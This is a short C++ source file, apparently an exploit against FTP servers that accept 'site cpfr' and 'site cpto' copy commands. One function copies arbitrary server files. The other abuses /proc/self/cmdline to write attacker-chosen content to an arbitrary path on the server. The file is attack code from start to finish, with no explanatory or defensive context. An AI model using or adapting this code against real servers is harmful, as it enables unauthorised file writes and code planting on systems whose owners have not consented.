#include "hdr.h"

int local(SOCKET sock, string lpath, string rpath) {
	char buf[100];

	recv(sock, buf, 100, NULL);
	send(sock, ("site cpfr " + lpath + "\n").c_str(), 11 + lpath.length(), NULL);
	recv(sock, buf, 100, NULL);

	ZeroMemory(buf, 100);
	send(sock, ("site cpto " + rpath + "\n").c_str(), 11 + rpath.length(), NULL);
	recv(sock, buf, 100, NULL);

	return (string(buf).find("250") != -1);
}

int remote(SOCKET sock, string lpath, string rpath) {
	ifstream f(lpath);
	if (!f.is_open()) {
		return 2;
	}
	string contents = "";
	while (!f.eof()) {
		f >> contents;
	}

	char buf[100];
	recv(sock, buf, 100, NULL);
	send(sock, "site cpfr /proc/self/cmdline\n", 29, NULL);
	recv(sock, buf, 100, NULL);
	send(sock, ("site cpto " + contents + "\n").c_str(), 11 + contents.length(), NULL);
	recv(sock, buf, 100, NULL);
	send(sock, ("site cpfr " + contents + "\n").c_str(), 11 + contents.length(), NULL);
	recv(sock, buf, 100, NULL);

	ZeroMemory(buf, 100);
	send(sock, ("site cpto " + rpath + "\n").c_str(), 11 + rpath.length(), NULL);
	recv(sock, buf, 100, NULL);

	return (string(buf).find("250") != -1);
}